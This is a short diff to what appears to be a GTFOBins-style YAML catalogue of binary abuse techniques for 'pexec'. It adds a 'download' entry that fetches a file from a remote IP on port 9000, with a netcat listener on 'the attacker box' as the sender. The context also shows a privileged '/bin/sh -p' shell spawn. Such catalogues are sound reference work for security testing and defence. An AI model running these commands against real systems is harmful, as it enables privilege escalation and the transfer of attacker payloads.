@@ -10,4 +10,15 @@ functions:
           pexec /bin/sh -p
         shell: false
       unprivileged:
+  download:
+  - code: |-
+      pexec --remote --connect $IP_ADDR:9000 > $OUT_FILE
+    contexts:
+      unprivileged:
+    sender:
+      code: |-
+        nc -l -p 9000 < $IN_FILE
+      comment: |-
+        A TCP server can be used on the attacker box to send the data.
+
 ...
